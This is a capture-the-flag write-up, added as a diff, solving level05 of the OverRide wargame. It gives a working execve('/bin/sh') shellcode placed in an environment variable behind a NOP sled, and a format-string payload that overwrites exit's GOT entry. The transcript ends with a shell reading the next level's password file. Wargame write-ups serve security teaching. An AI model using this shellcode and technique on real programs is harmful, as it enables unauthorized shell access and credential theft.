@@ -1,0 +1,87 @@
+```bash
+(gdb) info register
+esp            0xffffd670	0xffffd670
+ebp            0xffffd708	0xffffd708
+# char s[100]; // [esp+28h] [ebp-70h] BYREF
+```
+
+First we can write our shellcode:
+7:  31 c0                   xor    eax,eax
+9:  31 d2                   xor    edx,edx
+b:  50                      push   eax
+c:  68 2f 2f 73 68          push   0x68732f2f
+11: 68 2f 62 69 6e          push   0x6e69622f
+16: 89 e3                   mov    ebx,esp
+18: 50                      push   eax
+19: 53                      push   ebx
+1a: 89 e1                   mov    ecx,esp
+1c: b0 0b                   mov    al,0xb
+1e: cd 80                   int    0x80 
+"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+We gonna write this shellcode in the env, because the xor in the string is anoing:
+```bash
+printf '\x90%.0s' {1..100} > /tmp/level05_shell_code
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" >> /tmp/level05_shell_code
+export SHELL_CODE="$(cat /tmp/level05_shell_code)"
+```
+
+```bash
+level05@OverRide:~$ env | grep SHELL_CODE
+SHELL_CODE=1�1�Ph//shh/bin��PS��
+
+level05@OverRide:~$ gdb level05
+(gdb) b main
+(gdb) run
+Breakpoint 1, 0x08048449 in main ()
+(gdb) call (void *)getenv("SHELL_CODE")
+$1 = (void *) 0xffffded6
+```
+
+To verify: 
+Get the shellcode address:
+```c
+cat > /tmp/get_address.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char *shell_addr = getenv("SHELL_CODE");
+    if (shell_addr) {
+        printf("SHELL_CODE address: %p\n", shell_addr);
+    } else {
+        printf("SHELL_CODE not found\n");
+    }
+    return 0;
+}
+EOF
+
+level05@OverRide:~$ gcc -m32 /tmp/get_address.c -o /tmp/./a.out
+level05@OverRide:~$ /tmp/./a.out 
+SHELL_CODE address: 0xffffded6
+
+Get the address of the exit in the plt:
+```bash
+level05@OverRide:~$ readelf --all level05 | grep exit
+080497e0  00000407 R_386_JUMP_SLOT   00000000   exit
+```
+
+More details in exploit.py, get the payload: 
+``` 
+git:(master) ✗ python level05OK/Ressources/exploit.py
+57046
+65535
+------------------------
+b'\xe0\x97\x04\x08\xe2\x97\x04\x08%57038x%10$hn%8489x%11$hn\x00'
+```
+
+In the Override VM: 
+level05@OverRide:~$ rm -f /tmp/level05_payload 
+level05@OverRide:~$ echo -ne '\xe0\x97\x04\x08\xe2\x97\x04\x08%57038x%10$hn%8489x%11$hn\x00' >  /tmp/level05_payload 
+level05@OverRide:~$ cat /tmp/level05_payload - | ./level05 
+
+
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
